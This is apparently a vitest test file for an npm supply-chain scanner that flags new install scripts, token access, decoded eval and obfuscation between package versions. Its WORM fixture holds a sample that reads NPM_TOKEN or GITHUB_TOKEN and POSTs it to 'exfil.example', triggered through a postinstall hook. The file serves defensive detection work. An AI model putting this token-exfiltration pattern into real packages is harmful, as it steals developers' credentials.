import { describe, expect, it } from "vitest";
import { runCheck } from "../src/check.js";
import { codeSignals, installScriptFiles } from "../src/signals/code.js";
import type { SignalContext } from "../src/signals/index.js";
import { readTarball, type FetchTarball } from "../src/tarball.js";
import { defaultConfig, type Packument } from "../src/types.js";
import { NOW, makeTgz } from "./helpers.js";

const WORM = `
const https = require("https");
const t = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
https.request({ host: "exfil.example", method: "POST" }).end(t);
eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString());
`;

function ctx(over: Partial<SignalContext> & { current: Record<string, string>; previous?: Record<string, string> }): SignalContext {
  const { current, previous, ...rest } = over;
  return {
    change: { name: "pkg", version: "1.0.1", previous: previous ? "1.0.0" : undefined },
    packument: null,
    config: defaultConfig,
    now: NOW,
    files: { current: new Map(Object.entries(current)), previous: previous && new Map(Object.entries(previous)) },
    ...rest,
  };
}

const run = (c: SignalContext) => codeSignals.map((s) => s(c)).filter((f) => f !== null).map((f) => `${f.severity} ${f.signal}: ${f.reason}`);

describe("readTarball", () => {
  it("reads text files and strips the package/ folder", () => {
    const files = readTarball(makeTgz({ "index.js": "module.exports = 1", "lib/a.cjs": "x", "logo.png": "binary" }));
    expect([...files.keys()]).toEqual(["index.js", "lib/a.cjs"]);
    expect(files.get("index.js")).toBe("module.exports = 1");
  });
});

describe("installScriptFiles", () => {
  it("finds files run with node", () => {
    expect(installScriptFiles({ postinstall: "node ./scripts/setup && echo ok", preinstall: "node --no-warnings bundle.js" })).toEqual([
      "bundle.js",
      "scripts/setup.js",
    ]);
    expect(installScriptFiles({ install: "node-gyp rebuild" })).toEqual([]);
  });
});

describe("code signals", () => {
  const versions = (prevScripts?: Record<string, string>, scripts?: Record<string, string>): Packument => ({
    name: "pkg",
    versions: { "1.0.0": { version: "1.0.0", scripts: prevScripts }, "1.0.1": { version: "1.0.1", scripts } },
  });

  it("flags a Shai-Hulud style update: new postinstall running a new bundle that steals tokens", () => {
    const c = ctx({
      packument: versions(undefined, { postinstall: "node bundle.js" }),
      previous: { "index.js": "module.exports = 1" },
      current: { "index.js": "module.exports = 1", "bundle.js": WORM },
    });
    expect(run(c)).toEqual([
      "high credential-access: `bundle.js` reads `NPM_TOKEN` and makes network calls",
      'high eval-decoded: `bundle.js` runs decoded code: `eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString…`',
      "high install-script-code: Install script `bundle.js` makes network calls, reads tokens",
    ]);
  });

  it("ignores an install script that was already there and did the same things (esbuild style)", () => {
    const install = 'const cp = require("child_process"); cp.execFileSync(bin, ["--version"]);';
    const c = ctx({
      packument: versions({ postinstall: "node install.js" }, { postinstall: "node install.js" }),
      previous: { "install.js": `${install} // 1.0.0` },
      current: { "install.js": `${install} // 1.0.1` },
    });
    expect(run(c)).toEqual([]);
  });

  it("flags an existing install script that starts calling the network", () => {
    const c = ctx({
      packument: versions({ postinstall: "node install.js" }, { postinstall: "node install.js" }),
      previous: { "install.js": 'require("child_process").execSync("x")' },
      current: { "install.js": 'require("child_process").execSync("x"); fetch("https://x.example")' },
    });
    expect(run(c)).toEqual(["high install-script-code: Install script `install.js` makes network calls (new in this version)"]);
  });

  it("flags obfuscated new code but not code that was already obfuscated", () => {
    const ob = Array.from({ length: 12 }, (_, i) => `var _0x${(0xa000 + i).toString(16)}=${i};`).join("");
    expect(run(ctx({ previous: { "a.js": "1" }, current: { "a.js": ob } }))).toEqual([
      "medium obfuscated-code: `a.js` looks obfuscated (12 `_0x…` names)",
    ]);
    expect(run(ctx({ previous: { "a.js": `${ob}//old` }, current: { "a.js": ob } }))).toEqual([]);
  });

  it("does not flag token access that the previous version already had", () => {
    const gh = 'const t = process.env.GITHUB_TOKEN; fetch("https://api.github.com", { headers: { t } });';
    expect(run(ctx({ previous: { "a.js": gh }, current: { "a.js": `${gh}\n// v2` } }))).toEqual([]);
  });
});

describe("runCheck with code scan", () => {
  const base = JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/pkg": { version: "1.0.0" }, "node_modules/plain": { version: "2.0.0" } } });
  const head = JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/pkg": { version: "1.0.1" }, "node_modules/fresh": { version: "1.0.0" } } });
  const tgz = (n: string, v: string) => `https://registry.npmjs.org/${n}/-/${n}-${v}.tgz`;
  const packuments: Record<string, Packument> = {
    pkg: {
      name: "pkg",
      time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2020-01-01T00:00:00Z", "1.0.1": "2026-01-01T00:00:00Z" },
      versions: {
        "1.0.0": { version: "1.0.0", dist: { tarball: tgz("pkg", "1.0.0") } },
        "1.0.1": { version: "1.0.1", dist: { tarball: tgz("pkg", "1.0.1") } },
      },
    },
    fresh: {
      name: "fresh",
      time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2020-01-01T00:00:00Z" },
      versions: { "1.0.0": { version: "1.0.0", dist: { tarball: tgz("fresh", "1.0.0") } } },
    },
  };
  const tarballs: Record<string, Uint8Array> = {
    [tgz("pkg", "1.0.0")]: makeTgz({ "index.js": "module.exports = 1" }),
    [tgz("pkg", "1.0.1")]: makeTgz({ "index.js": `module.exports = 1;\n${WORM}` }),
  };

  it("downloads updated packages only, and fails on hidden code", async () => {
    const asked: string[] = [];
    const fetchTarball: FetchTarball = async (url) => {
      asked.push(url);
      return tarballs[url] ? readTarball(tarballs[url]!) : null;
    };
    const r = await runCheck({ baseLock: base, headLock: head, config: defaultConfig, now: NOW, fetchPackument: async (n) => packuments[n] ?? null, fetchTarball });
    expect(asked.sort()).toEqual([tgz("pkg", "1.0.0"), tgz("pkg", "1.0.1")]);
    expect(r.findings.map((f) => `${f.name} ${f.signal}`)).toEqual(["pkg credential-access", "pkg eval-decoded"]);
    expect(r.failed).toBe(true);
  });

  it("skips downloads when scanCode is off", async () => {
    const fetchTarball: FetchTarball = async () => {
      throw new Error("should not download");
    };
    const r = await runCheck({ baseLock: base, headLock: head, config: { ...defaultConfig, scanCode: false }, now: NOW, fetchPackument: async (n) => packuments[n] ?? null, fetchTarball });
    expect(r.findings).toEqual([]);
  });
});
